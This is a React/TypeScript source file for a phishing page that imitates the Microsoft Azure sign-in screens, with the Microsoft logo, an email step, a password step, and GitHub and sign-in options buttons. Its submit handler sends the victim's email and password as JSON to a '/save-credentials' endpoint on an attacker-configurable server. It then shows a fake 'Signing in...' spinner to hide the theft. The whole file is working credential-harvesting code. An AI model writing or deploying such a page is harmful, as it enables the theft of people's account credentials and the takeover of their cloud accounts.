import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";

const API_URL = import.meta.env.VITE_API_URL || "http://localhost:5000";

function App() {
  const [email, setEmail] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const response = await fetch(`${API_URL}/save-credentials`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      if (response.ok) {
        console.log("Credentials saved successfully");
      } else {
        console.error("Error saving credentials");
      }
    } catch (error) {
      console.error("Network error:", error);
    }
  };

  useEffect(() => {
    if (loading) {
      const timer = setTimeout(() => {
        setLoading(false);
        setShowPassword(false);
        setEmail("");
        setPassword("");
      }, 10000);
      return () => clearTimeout(timer);
    }
  }, [loading]);

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-[#0078D4]">
        <div className="text-center">
          <div className="animate-spin rounded-full border-t-4 border-white border-solid h-16 w-16 mx-auto"></div>
          <p className="mt-4 text-white text-lg">Signing in...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col">
      <div className="flex-grow bg-[#0078D4] flex flex-col items-center justify-center p-4">
        <div className="text-white text-2xl mb-8">Microsoft Azure</div>

        {/* Animated Box + Content */}
        <AnimatePresence mode="wait">
          <motion.div
            key={showPassword ? "password" : "email"}
            initial={{ opacity: 0, x: 50 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -50 }}
            transition={{ duration: 0.3, ease: "easeInOut" }}
            className="bg-white shadow-lg w-full max-w-md p-6"
          >
            <div className="flex items-center mb-6">
              <img
                src="https://storageaccountforscipts.blob.core.windows.net/cybervance/cloud-200/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
                alt="Microsoft Logo"
                className="h-7 w-auto"
              />
            </div>

            {!showPassword ? (
              <>
                <div role="heading" aria-level="1" className="text-3xl font-semibold mb-2 text-gray-900">
                  Sign in
                </div>
                <p className="text-sm text-gray-600 mb-4">to continue to Microsoft Azure</p>

                <form
                  onSubmit={(e) => {
                    e.preventDefault();
                    setShowPassword(true);
                  }}
                >
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Email, phone, or Skype"
                    className="w-full p-2 border-b border-gray-300 focus:border-[#0078D4] outline-none mb-4 text-left pl-1"
                    required
                  />

                  <div className="text-sm text-gray-600 mb-4">
                    No account? <a href="#" className="text-[#0078D4] hover:underline">Create one!</a>
                  </div>

                  <div className="flex justify-end">
                    <button type="submit" className="bg-[#0078D4] text-white px-6 py-2 hover:bg-[#006abc]">
                      Next
                    </button>
                  </div>
                </form>
              </>
            ) : (
              <>
                <div className="mb-6">
                  <button onClick={() => setShowPassword(false)} className="text-[#0078D4] hover:underline text-sm flex items-center">
                    ← {email}
                  </button>
                </div>

                <div role="heading" aria-level="1" className="text-3xl font-semibold mb-2 text-gray-900">
                  Enter password
                </div>

                <form onSubmit={handleSubmit}>
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Password"
                    className="w-full p-2 border-b border-gray-300 focus:border-[#0078D4] outline-none mb-4"
                    required
                  />

                  <div className="text-sm text-[#0078D4] hover:underline mb-4 cursor-pointer">
                    Forgot password?
                  </div>

                  <div className="flex justify-end">
                    <button type="submit" className="bg-[#0078D4] text-white px-6 py-2 hover:bg-[#006abc]">
                      Sign in
                    </button>
                  </div>
                </form>
              </>
            )}
          </motion.div>
        </AnimatePresence>

        {/* GitHub and Sign-in Options - Hide on password screen */}
        <AnimatePresence>
          {!showPassword && (
            <motion.div
              initial={{ opacity: 1, y: 0 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 20 }}
              transition={{ duration: 0.3 }}
              className="bg-white shadow-lg w-full max-w-md mt-4"
            >
              <button className="w-full p-4 flex items-center justify-start text-gray-700 hover:bg-gray-50">
                <img
                  src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-github_4f133e101999f0f9f726427324505c7b.svg"
                  alt="GitHub Logo"
                  className="w-7 h-7 mr-4"
                />
                Sign in with GitHub
              </button>
              <hr />
              <button className="w-full p-4 flex items-center justify-start text-gray-700 hover:bg-gray-50">
                <img
                  src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
                  alt="Sign-in Options"
                  className="w-7 h-7 mr-4"
                />
                Sign-in options
              </button>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      <div className="bg-[#003C75] text-white py-2 px-6">
        <div className="max-w-md ml-auto flex justify-end gap-6 text-xs">
          <a href="#" className="hover:underline">Terms of use</a>
          <a href="#" className="hover:underline">Privacy & cookies</a>
          <button className="hover:underline">...</button>
        </div>
      </div>
    </div>
  );
}

export default App;
